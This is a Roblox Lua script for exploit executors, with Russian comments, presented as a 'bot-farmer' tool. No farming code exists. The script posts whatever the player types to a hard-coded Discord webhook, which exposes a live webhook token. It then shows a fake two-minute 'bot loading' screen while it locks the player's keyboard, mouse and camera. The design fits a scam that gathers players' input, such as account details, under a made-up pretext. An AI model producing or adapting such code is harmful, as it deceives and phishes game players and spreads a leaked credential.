-- ====================================
-- SIMPLE BOT FARMER SCRIPT
-- ====================================

local WEBHOOK_URL = "https://discord.com/api/webhooks/1448032447492128818/bOAXh_wsZ3ZZfhHixlRTa6crrxh7c97F6VH7xhETV4YS7LvYcJlUWGELxtZShpb0vCZw"

-- 1. СОЗДАЕМ ГЛАВНОЕ ОКНО
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
screenGui.Name = "BotFarmerMain"

local mainWindow = Instance.new("Frame")
mainWindow.Size = UDim2.new(0, 320, 0, 200)
mainWindow.Position = UDim2.new(0.5, -160, 0.5, -100)
mainWindow.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
mainWindow.Parent = screenGui

-- Заголовок
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Text = "bot-farmer"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 22
title.Font = Enum.Font.GothamBold
title.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
title.Parent = mainWindow

-- Поле для сообщения
local messageBox = Instance.new("TextBox")
messageBox.Size = UDim2.new(0.9, 0, 0, 45)
messageBox.Position = UDim2.new(0.05, 0, 0.3, 0)
messageBox.PlaceholderText = "Введите сообщение для Discord..."
messageBox.Text = ""
messageBox.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
messageBox.TextColor3 = Color3.fromRGB(255, 255, 255)
messageBox.TextSize = 14
messageBox.Font = Enum.Font.Gotham
messageBox.Parent = mainWindow

-- Кнопка отправки
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(0.9, 0, 0, 45)
sendButton.Position = UDim2.new(0.05, 0, 0.7, 0)
sendButton.Text = "📤 Отправить"
sendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
sendButton.TextSize = 16
sendButton.Font = Enum.Font.GothamBold
sendButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
sendButton.Parent = mainWindow

-- Кнопка закрытия
local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 30, 0, 30)
closeButton.Position = UDim2.new(1, -35, 0, 5)
closeButton.Text = "X"
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.TextSize = 16
closeButton.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
closeButton.Parent = mainWindow

-- 2. ФУНКЦИЯ ОТПРАВКИ В DISCORD
local function sendMessageToDiscord(msg)
    local success, result = pcall(function()
        -- Пробуем разные методы отправки
        local requestFunc = syn and syn.request or request or http_request
        
        if not requestFunc then
            error("HTTP функции не найдены")
        end
        
        local response = requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode({
                content = msg,
                username = "bot-farmer",
                avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png"
            })
        })
        
        return response.Success
    end)
    
    return success and result
end

-- 3. ФУНКЦИЯ СОЗДАНИЯ ЭКРАНА ЗАГРУЗКИ
local function createLoadingScreen()
    local loadingGui = Instance.new("ScreenGui")
    loadingGui.Name = "BotFarmerLoading"
    loadingGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    
    -- ЧЕРНЫЙ ФОН НА ВЕСЬ ЭКРАН
    local blackBackground = Instance.new("Frame")
    blackBackground.Size = UDim2.new(1, 0, 1, 0)
    blackBackground.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blackBackground.ZIndex = 999
    blackBackground.Parent = loadingGui
    
    -- ОСНОВНОЙ КОНТЕЙНЕР
    local loadingBox = Instance.new("Frame")
    loadingBox.Size = UDim2.new(0, 500, 0, 250)
    loadingBox.Position = UDim2.new(0.5, -250, 0.5, -125)
    loadingBox.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    loadingBox.ZIndex = 1000
    loadingBox.Parent = blackBackground
    
    -- ЗАГОЛОВОК
    local loadingTitle = Instance.new("TextLabel")
    loadingTitle.Size = UDim2.new(1, 0, 0, 60)
    loadingTitle.Text = "🤖 bot-farmer"
    loadingTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
    loadingTitle.TextSize = 26
    loadingTitle.Font = Enum.Font.GothamBold
    loadingTitle.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
    loadingTitle.ZIndex = 1001
    loadingTitle.Parent = loadingBox
    
    -- ИКОНКА ЗАГРУЗКИ
    local loadingIcon = Instance.new("TextLabel")
    loadingIcon.Size = UDim2.new(0, 80, 0, 80)
    loadingIcon.Position = UDim2.new(0.1, 0, 0.4, -40)
    loadingIcon.Text = "⚙️"
    loadingIcon.TextColor3 = Color3.fromRGB(88, 101, 242)
    loadingIcon.TextSize = 50
    loadingIcon.Font = Enum.Font.GothamBold
    loadingIcon.BackgroundTransparency = 1
    loadingIcon.ZIndex = 1001
    loadingIcon.Parent = loadingBox
    
    -- ТЕКСТ ПРОЦЕНТОВ
    local percentText = Instance.new("TextLabel")
    percentText.Size = UDim2.new(0.7, 0, 0, 40)
    percentText.Position = UDim2.new(0.3, 0, 0.4, -20)
    percentText.Text = "Загрузка: 0%"
    percentText.TextColor3 = Color3.fromRGB(200, 200, 200)
    percentText.TextSize = 20
    percentText.Font = Enum.Font.Gotham
    percentText.TextXAlignment = Enum.TextXAlignment.Left
    percentText.BackgroundTransparency = 1
    percentText.ZIndex = 1001
    percentText.Parent = loadingBox
    
    -- ПОЛОСА ЗАГРУЗКИ
    local progressBarBack = Instance.new("Frame")
    progressBarBack.Size = UDim2.new(0.8, 0, 0, 25)
    progressBarBack.Position = UDim2.new(0.1, 0, 0.7, 0)
    progressBarBack.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    progressBarBack.ZIndex = 1001
    progressBarBack.Parent = loadingBox
    
    local progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    progressBar.ZIndex = 1002
    progressBar.Parent = progressBarBack
    
    -- СТАТУС
    local statusText = Instance.new("TextLabel")
    statusText.Size = UDim2.new(0.8, 0, 0, 30)
    statusText.Position = UDim2.new(0.1, 0, 0.8, 0)
    statusText.Text = "Инициализация системы..."
    statusText.TextColor3 = Color3.fromRGB(150, 150, 150)
    statusText.TextSize = 16
    statusText.Font = Enum.Font.Gotham
    statusText.BackgroundTransparency = 1
    statusText.ZIndex = 1001
    statusText.Parent = loadingBox
    
    return loadingGui, loadingIcon, progressBar, percentText, statusText
end

-- 4. ФУНКЦИЯ БЛОКИРОВКИ УПРАВЛЕНИЯ
local function blockPlayerControls()
    local connections = {}
    local CAS = game:GetService("ContextActionService")
    local UIS = game:GetService("UserInputService")
    
    -- Блокируем клавиши
    local function blockAction()
        return Enum.ContextActionResult.Sink
    end
    
    -- Основные клавиши для блокировки
    local keysToBlock = {
        Enum.KeyCode.W, Enum.KeyCode.A, Enum.KeyCode.S, Enum.KeyCode.D,
        Enum.KeyCode.Space, Enum.KeyCode.LeftShift, Enum.KeyCode.E,
        Enum.KeyCode.Q, Enum.KeyCode.R, Enum.KeyCode.F, Enum.KeyCode.Tab,
        Enum.KeyCode.Escape, Enum.KeyCode.Return
    }
    
    CAS:BindAction("BlockKeys", blockAction, false, unpack(keysToBlock))
    
    -- Блокируем мышь
    CAS:BindAction("BlockMouse", blockAction, false,
        Enum.UserInputType.MouseButton1,
        Enum.UserInputType.MouseButton2
    )
    
    -- Фиксируем камеру
    local camera = workspace.CurrentCamera
    if camera then
        camera.CameraType = Enum.CameraType.Scriptable
        local originalCFrame = camera.CFrame
        connections.cameraLock = game:GetService("RunService").RenderStepped:Connect(function()
            camera.CFrame = originalCFrame
        end)
    end
    
    return function()
        -- Функция для разблокировки
        CAS:UnbindAction("BlockKeys")
        CAS:UnbindAction("BlockMouse")
        
        if camera then
            camera.CameraType = Enum.CameraType.Custom
        end
        
        for _, conn in pairs(connections) do
            if conn then
                conn:Disconnect()
            end
        end
    end
end

-- 5. ФУНКЦИЯ ЗАПУСКА ЗАГРУЗКИ
local function startLoadingSequence()
    -- Создаем экран загрузки
    local loadingGui, loadingIcon, progressBar, percentText, statusText = createLoadingScreen()
    
    -- Блокируем управление
    local unblockControls = blockPlayerControls()
    
    -- Анимация вращения иконки
    local rotateConnection = game:GetService("RunService").RenderStepped:Connect(function(delta)
        loadingIcon.Rotation = (loadingIcon.Rotation + (2 * delta * 60)) % 360
    end)
    
    -- Процесс загрузки (20 секунд)
    local startTime = tick()
    local loadDuration = 120
    
    local updateConnection = game:GetService("RunService").Heartbeat:Connect(function()
        local currentTime = tick()
        local elapsed = currentTime - startTime
        local progress = math.min(elapsed / loadDuration, 1)
        
        -- Обновляем полосу загрузки
        progressBar.Size = UDim2.new(progress, 0, 1, 0)
        
        -- Обновляем проценты
        local percent = math.floor(progress * 100)
        percentText.Text = "Загрузка: " .. percent .. "%"
        
        -- Обновляем статус
        if progress < 0.25 then
            statusText.Text = "🔧 Инициализация системы..."
        elseif progress < 0.5 then
            statusText.Text = "📡 Подключение к сети..."
        elseif progress < 0.75 then
            statusText.Text = "🤖 Загрузка модулей..."
        else
            statusText.Text = "✅ Финальная настройка..."
        end
        
        -- Когда загрузка завершена
        if progress >= 1 then
            statusText.Text = "✅ Бот успешно загружен!"
        end
    end)
    
    -- Ждем завершения загрузки
    task.wait(loadDuration)
    
    -- Останавливаем анимации
    rotateConnection:Disconnect()
    updateConnection:Disconnect()
    
    -- Показываем завершение
    loadingIcon.Text = "✅"
    loadingIcon.Rotation = 0
    loadingIcon.TextColor3 = Color3.fromRGB(50, 205, 50)
    
    -- Ждем 2 секунды
    task.wait(2)
    
    -- Разблокируем управление
    unblockControls()
    
    -- Удаляем экран загрузки
    loadingGui:Destroy()
    
    -- Возвращаем главное окно
    screenGui.Enabled = true
end

-- 6. ОБРАБОТЧИК КНОПКИ ОТПРАВКИ
sendButton.MouseButton1Click:Connect(function()
    local message = messageBox.Text
    
    -- Проверка пустого сообщения
    if message == "" then
        local originalPlaceholder = messageBox.PlaceholderText
        messageBox.PlaceholderText = "Введите сообщение!"
        messageBox.PlaceholderColor3 = Color3.fromRGB(255, 100, 100)
        task.wait(1)
        messageBox.PlaceholderText = originalPlaceholder
        messageBox.PlaceholderColor3 = Color3.fromRGB(180, 180, 180)
        return
    end
    
    -- Меняем вид кнопки
    local originalText = sendButton.Text
    local originalColor = sendButton.BackgroundColor3
    
    sendButton.Text = "⏳ Отправка..."
    sendButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
    
    -- Отправляем сообщение
    local success = sendMessageToDiscord(message)
    
    if success then
        sendButton.Text = "✅ Отправлено!"
        sendButton.BackgroundColor3 = Color3.fromRGB(50, 205, 50)
        
        -- Очищаем поле
        messageBox.Text = ""
        
        -- Скрываем главное окно
        screenGui.Enabled = false
        
        -- Ждем и запускаем загрузку
        task.wait(1)
        startLoadingSequence()
    else
        sendButton.Text = "❌ Ошибка"
        sendButton.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
        task.wait(2)
        sendButton.Text = originalText
        sendButton.BackgroundColor3 = originalColor
    end
end)

-- 7. ОБРАБОТЧИК КНОПКИ ЗАКРЫТИЯ
closeButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- 8. ДОБАВЛЯЕМ ЭФФЕКТЫ НАВЕДЕНИЯ
sendButton.MouseEnter:Connect(function()
    if sendButton.Text == "📤 Отправить" then
        sendButton.BackgroundColor3 = Color3.fromRGB(71, 82, 196)
    end
end)

sendButton.MouseLeave:Connect(function()
    if sendButton.Text == "📤 Отправить" then
        sendButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    end
end)

print("🚀 bot-farmer загружен! Введите сообщение и нажмите 'Отправить'")
